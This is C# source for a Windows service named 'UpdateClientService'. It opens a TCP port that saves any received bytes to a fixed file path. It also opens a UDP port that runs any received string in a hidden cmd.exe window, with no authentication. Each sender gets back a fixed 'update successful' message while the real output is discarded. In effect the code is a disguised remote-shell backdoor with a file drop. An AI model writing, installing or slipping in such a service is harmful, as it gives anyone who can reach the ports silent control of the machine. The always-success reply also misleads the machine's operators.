using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UpdateClientService
{
    public partial class Service1 : ServiceBase
    {
        ConcurrentQueue<MessageObject> commands = new ConcurrentQueue<MessageObject>();
        ConcurrentQueue<MessageObject> results = new ConcurrentQueue<MessageObject>();

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Task.Factory.StartNew(StartReceive);
        }

        private void StartReceive()
        {
            Task.Factory.StartNew(ReceiveCommand);
            TcpListener listener = new TcpListener(IPAddress.Any, 22227);
            while (true)
            {
                listener.Start();
                TcpClient client = listener.AcceptTcpClient();
                //Console.WriteLine("连接成功");
                Task.Factory.StartNew(() => ReceiveFile(client));
            }
        }

        private void ReceiveFile(TcpClient client)
        {
            try
            {
            NetworkStream ns = client.GetStream();
            using (FileStream fs = new FileStream(@"C:\Users\temp\temp.file", FileMode.Create))
            {
                byte[] recBlock = new byte[1024];
                while (true)
                {
                    int readSize = ns.Read(recBlock, 0, 1024);
                    if (readSize == 0) break;
                    fs.Write(recBlock, 0, readSize);
                }
            }
            //Console.WriteLine("写入成功");
            }
            catch (Exception e)
            {
                //Console.WriteLine("写入失败");
            }

        }

        private void ReceiveCommand()
        {
            Task.Factory.StartNew(sendResult);
            Task.Factory.StartNew(runCommand);
            UdpClient receiveUdpClient = new UdpClient(22228);
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
            while (true)
            {
                //Console.WriteLine("等待命令");
                try
                {
                    Byte[] receiveBytes = receiveUdpClient.Receive(ref RemoteIpEndPoint);
                    String returnData = Encoding.UTF8.GetString(receiveBytes);
                    String ip = RemoteIpEndPoint.Address.ToString();
                    String port = RemoteIpEndPoint.Port.ToString();
                    MessageObject msg = new MessageObject(ip, port, returnData);
                    commands.Enqueue(msg);
                    //Console.WriteLine("有命令来了");
                }
                catch (Exception e)
                { }
            }
        }

        private void runCommand()
        {
            MessageObject commandobj;
            while (true)
            {
                if (commands.TryDequeue(out commandobj))
                {
                    //Console.WriteLine("开始执行命令");
                    Task.Factory.StartNew(() => runCMD(commandobj));
                }
                Thread.Sleep(1000);
            }
        }

        private void runCMD(MessageObject commandobj)
        {
            String command = commandobj.message;
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.WriteLine(command);
            p.StandardInput.WriteLine("exit");
            String result = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
            MessageObject msg = new MessageObject(commandobj.ip, commandobj.port, "更新成功\n");
            results.Enqueue(msg);
        }

        private void sendResult()
        {
            MessageObject sendobj;
            while (true)
            {
                if (results.TryDequeue(out sendobj))
                {
                    String result = GetInternalIP() + ":\t\t\n" + sendobj.message;
                    String ip = sendobj.ip;
                    String port = sendobj.port;
                    UdpClient sendUdpclient = new UdpClient(ip, 22229);
                    byte[] sendByte = Encoding.UTF8.GetBytes(result);
                    sendUdpclient.Send(sendByte, sendByte.Length);
                    //Console.WriteLine("结果发送成功");
                }
                Thread.Sleep(1000);
            }
        }

        //获取内网IP
        private string GetInternalIP()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        protected override void OnStop()
        {
        }
    }
}
